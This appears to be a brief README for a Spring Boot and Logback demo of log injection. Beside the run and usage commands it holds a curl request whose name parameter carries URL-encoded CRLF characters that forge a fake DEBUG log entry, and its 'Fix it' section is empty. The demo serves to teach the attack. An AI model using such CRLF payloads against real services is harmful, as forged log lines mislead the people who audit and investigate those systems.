# Log Injection with Spring Boot and Logback

- Run

```
./gradlew bootRun
```

- Usage

```
curl http://localhost:8080/\?name\=Frodon
```

- [Log Forging Attack](https://owasp.org/www-community/attacks/Log_Injection) using [CRLF injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)

```
curl http://localhost:8080/\?name\=Marty%0d%0a1985-10-30%2021%3A59%3A01.108%20DEBUG%20128537%20---%20%5Bnio-8080-exec-1%5D%20net.example.logging.HelloController%20%20%20%20%20%20%3A%20You%20have%20been%20pwed%0A
```

- Fix it